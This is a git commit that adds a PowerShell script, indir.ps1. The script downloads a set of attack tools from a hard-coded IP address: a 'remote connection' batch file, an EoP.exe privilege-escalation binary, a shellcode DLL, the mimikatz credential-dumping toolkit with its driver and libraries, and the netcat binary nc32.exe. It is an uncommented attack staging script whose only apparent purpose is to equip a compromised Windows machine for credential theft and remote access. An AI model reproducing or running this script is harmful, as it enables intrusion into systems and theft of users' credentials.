7cdedcd2dbff7b8576088e6410ee8e2c2aca4a19
sinemaslan06 <84999133+sinemaslan06@users.noreply.github.com>
2021-08-18 18:45:26 +0300

    Add files via upload

---
+++ indir.ps1
@@ -0,0 +1,19 @@
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile('http://18.222.176.5/uzakbaglanti.bat','uzakbaglanti.bat')
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile('http://18.222.176.5/EoP.exe','EoP.exe')
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile('http://18.222.176.5/Shellcode.dll','Shellcode.dll')
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile('http://18.222.176.5/mimikatz.bat','mimikatz.bat')
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile('http://18.222.176.5/mimikatz.exe','mimikatz.exe')
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile('http://18.222.176.5/mimidrv.sys','mimidrv.sys')
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile('http://18.222.176.5/mimilib.dll','mimilib.dll')
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile('http://18.222.176.5/mimilove.exe','mimilove.exe')
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile('http://18.222.176.5/nc32.exe','nc32.exe')
+
